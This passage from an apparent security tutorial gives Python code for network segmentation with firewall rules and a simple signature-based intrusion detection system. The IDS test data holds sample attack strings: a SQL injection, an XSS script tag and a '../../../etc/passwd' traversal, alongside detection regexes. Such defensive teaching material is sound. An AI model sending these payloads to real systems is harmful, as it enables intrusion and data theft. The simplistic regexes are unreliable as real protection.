        self.segments = {}
        self.firewall_rules = []
        self.vlans = {}
    
    def create_segment(self, segment_name, network_range, security_level):
        """Create a network segment"""
        self.segments[segment_name] = {
            'network_range': network_range,
            'security_level': security_level,  # 1-5, 5 being highest
            'allowed_protocols': [],
            'hosts': []
        }
    
    def add_host_to_segment(self, segment_name, host_ip, host_type):
        """Add host to network segment"""
        if segment_name in self.segments:
            self.segments[segment_name]['hosts'].append({
                'ip': host_ip,
                'type': host_type,
                'status': 'active'
            })
    
    def create_firewall_rule(self, source_segment, dest_segment, protocol, port, action):
        """Create firewall rule between segments"""
        rule = {
            'id': len(self.firewall_rules) + 1,
            'source': source_segment,
            'destination': dest_segment,
            'protocol': protocol,
            'port': port,
            'action': action,  # allow/deny
            'created_at': time.time()
        }
        self.firewall_rules.append(rule)
        return rule['id']
    
    def check_access(self, source_segment, dest_segment, protocol, port):
        """Check if access is allowed between segments"""
        # Default deny
        allowed = False
        
        for rule in self.firewall_rules:
            if (rule['source'] == source_segment and 
                rule['destination'] == dest_segment and
                rule['protocol'] == protocol and
                rule['port'] == port):
                
                if rule['action'] == 'allow':
                    allowed = True
                elif rule['action'] == 'deny':
                    allowed = False
                    break  # Explicit deny overrides allow
        
        return allowed
    
    def create_dmz(self):
        """Create DMZ segment"""
        self.create_segment('DMZ', '192.168.100.0/24', 3)
        
        # DMZ rules - limited access
        self.create_firewall_rule('Internet', 'DMZ', 'TCP', 80, 'allow')   # HTTP
        self.create_firewall_rule('Internet', 'DMZ', 'TCP', 443, 'allow')  # HTTPS
        self.create_firewall_rule('DMZ', 'Internal', 'TCP', 3306, 'allow') # Database
        self.create_firewall_rule('Internal', 'DMZ', 'TCP', 22, 'allow')   # SSH management
    
    def generate_security_report(self):
        """Generate network security report"""
        report = {
            'segments': len(self.segments),
            'firewall_rules': len(self.firewall_rules),
            'security_analysis': {}
        }
        
        for segment_name, segment in self.segments.items():
            report['security_analysis'][segment_name] = {
                'security_level': segment['security_level'],
                'host_count': len(segment['hosts']),
                'risk_assessment': self.assess_segment_risk(segment_name)
            }
        
        return report
    
    def assess_segment_risk(self, segment_name):
        """Assess risk level of network segment"""
        if segment_name not in self.segments:
            return 'Unknown'
        
        segment = self.segments[segment_name]
        
        # Count rules allowing access to this segment
        inbound_rules = sum(1 for rule in self.firewall_rules 
                           if rule['destination'] == segment_name and rule['action'] == 'allow')
        
        if segment['security_level'] >= 4 and inbound_rules <= 2:
            return 'Low'
        elif segment['security_level'] >= 3 and inbound_rules <= 5:
            return 'Medium'
        else:
            return 'High'

# Usage
network = NetworkSegmentation()

# Create network segments
network.create_segment('Internal', '192.168.1.0/24', 5)
network.create_segment('Guest', '192.168.50.0/24', 2)
network.create_segment('Management', '192.168.10.0/24', 4)

# Create DMZ
network.create_dmz()

# Add hosts
network.add_host_to_segment('Internal', '192.168.1.10', 'Database Server')
network.add_host_to_segment('Internal', '192.168.1.20', 'Application Server')
network.add_host_to_segment('DMZ', '192.168.100.10', 'Web Server')

# Test access
access_allowed = network.check_access('Internet', 'DMZ', 'TCP', 443)
print(f"Internet to DMZ HTTPS access: {access_allowed}")

# Generate report
report = network.generate_security_report()
print(f"Network Security Report: {report}")
```

### Intrusion Detection and Prevention

**Network-based IDS/IPS**:
```python
import re
import time
from collections import defaultdict, deque

class NetworkIDS:
    def __init__(self):
        self.signatures = []
        self.anomaly_baselines = {}
        self.alerts = []
        self.blocked_ips = set()
        self.connection_tracking = defaultdict(list)
        self.rate_limits = defaultdict(lambda: deque(maxlen=100))
        
        self.load_signatures()
    
    def load_signatures(self):
        """Load attack signatures"""
        self.signatures = [
            {
                'id': 1,
                'name': 'SQL Injection Attempt',
                'pattern': r"(union|select|insert|delete|drop|create|alter).*(\s|%20)",
                'severity': 'High',
                'action': 'alert'
            },
            {
                'id': 2,
                'name': 'XSS Attempt',
                'pattern': r"<script[^>]*>.*?</script>",
                'severity': 'Medium',
                'action': 'alert'
            },
            {
                'id': 3,
                'name': 'Directory Traversal',
                'pattern': r"\.\./",
                'severity': 'Medium',
                'action': 'block'
            },
            {
                'id': 4,
                'name': 'Port Scan Detection',
                'pattern': r"SYN_SCAN",
                'severity': 'Low',
                'action': 'alert'
            },
            {
                'id': 5,
                'name': 'Brute Force Login',
                'pattern': r"FAILED_LOGIN",
                'severity': 'High',
                'action': 'block'
            }
        ]
    
    def analyze_packet(self, packet_data):
        """Analyze network packet for threats"""
        alerts_generated = []
        
        # Signature-based detection
        for signature in self.signatures:
            if re.search(signature['pattern'], packet_data['payload'], re.IGNORECASE):
                alert = self.generate_alert(signature, packet_data)
                alerts_generated.append(alert)
                
                if signature['action'] == 'block':
                    self.block_ip(packet_data['source_ip'])
        
        # Anomaly-based detection
        anomaly_alerts = self.detect_anomalies(packet_data)
        alerts_generated.extend(anomaly_alerts)
        
        return alerts_generated
    
    def detect_anomalies(self, packet_data):
        """Detect anomalous network behavior"""
        alerts = []
        source_ip = packet_data['source_ip']
        current_time = time.time()
        
        # Rate limiting detection
        self.rate_limits[source_ip].append(current_time)
        
        # Check for high connection rate
        recent_connections = [t for t in self.rate_limits[source_ip] 
                            if current_time - t < 60]  # Last minute
        
        if len(recent_connections) > 50:  # Threshold
            alert = {
                'id': len(self.alerts) + 1,
                'timestamp': current_time,
                'source_ip': source_ip,
                'alert_type': 'Anomaly',
                'description': f'High connection rate from {source_ip}: {len(recent_connections)} connections/minute',
                'severity': 'Medium',
                'action_taken': 'Rate Limited'
            }
            alerts.append(alert)
            self.rate_limit_ip(source_ip)
        
        # Port scan detection
        if packet_data.get('scan_indicator'):
            ports_scanned = len(set(conn['dest_port'] for conn in self.connection_tracking[source_ip]))
            if ports_scanned > 10:  # Scanning multiple ports
                alert = {
                    'id': len(self.alerts) + 1,
                    'timestamp': current_time,
                    'source_ip': source_ip,
                    'alert_type': 'Port Scan',
                    'description': f'Port scan detected from {source_ip}: {ports_scanned} ports scanned',
                    'severity': 'Medium',
                    'action_taken': 'Monitored'
                }
                alerts.append(alert)
        
        return alerts
    
    def generate_alert(self, signature, packet_data):
        """Generate security alert"""
        alert = {
            'id': len(self.alerts) + 1,
            'timestamp': time.time(),
            'signature_id': signature['id'],
            'signature_name': signature['name'],
            'source_ip': packet_data['source_ip'],
            'dest_ip': packet_data['dest_ip'],
            'payload_sample': packet_data['payload'][:100],
            'severity': signature['severity'],
            'action_taken': signature['action']
        }
        
        self.alerts.append(alert)
        return alert
    
    def block_ip(self, ip_address):
        """Block IP address"""
        self.blocked_ips.add(ip_address)
        print(f"IP {ip_address} has been blocked")
    
    def rate_limit_ip(self, ip_address):
        """Apply rate limiting to IP"""
        # In real implementation, this would configure network equipment
        print(f"Rate limiting applied to {ip_address}")
    
    def is_blocked(self, ip_address):
        """Check if IP is blocked"""
        return ip_address in self.blocked_ips
    
    def get_security_dashboard(self):
        """Generate security dashboard data"""
        current_time = time.time()
        last_24h = current_time - 86400
        
        recent_alerts = [alert for alert in self.alerts 
                        if alert['timestamp'] > last_24h]
        
        severity_counts = defaultdict(int)
        for alert in recent_alerts:
            severity_counts[alert['severity']] += 1
        
        dashboard = {
            'total_alerts_24h': len(recent_alerts),
            'blocked_ips': len(self.blocked_ips),
            'severity_breakdown': dict(severity_counts),
            'top_attacking_ips': self.get_top_attacking_ips(),
            'recent_alerts': recent_alerts[-10:]  # Last 10 alerts
        }
        
        return dashboard
    
    def get_top_attacking_ips(self):
        """Get top attacking IP addresses"""
        ip_counts = defaultdict(int)
        for alert in self.alerts:
            ip_counts[alert['source_ip']] += 1
        
        return sorted(ip_counts.items(), key=lambda x: x[1], reverse=True)[:5]

# Usage example
ids = NetworkIDS()

# Simulate network packets
test_packets = [
    {
        'source_ip': '192.168.1.100',
        'dest_ip': '10.0.0.1',
        'payload': 'GET /index.php?id=1 UNION SELECT * FROM users',
        'scan_indicator': False
    },
    {
        'source_ip': '192.168.1.101',
        'dest_ip': '10.0.0.1',
        'payload': '<script>alert("XSS")</script>',
        'scan_indicator': False
    },
    {
        'source_ip': '192.168.1.102',
        'dest_ip': '10.0.0.1',
        'payload': 'GET /../../../etc/passwd',
        'scan_indicator': False
    }
]

# Analyze packets
for packet in test_packets:
    alerts = ids.analyze_packet(packet)
    for alert in alerts:
        print(f"ALERT: {alert['signature_name']} from {alert['source_ip']}")

# Generate dashboard
dashboard = ids.get_security_dashboard()
print(f"\nSecurity Dashboard: {dashboard}")
```

---

*Continue to Part 2 for Software Development Security, Network Audit, Systems Audit, and Advanced Security Concepts*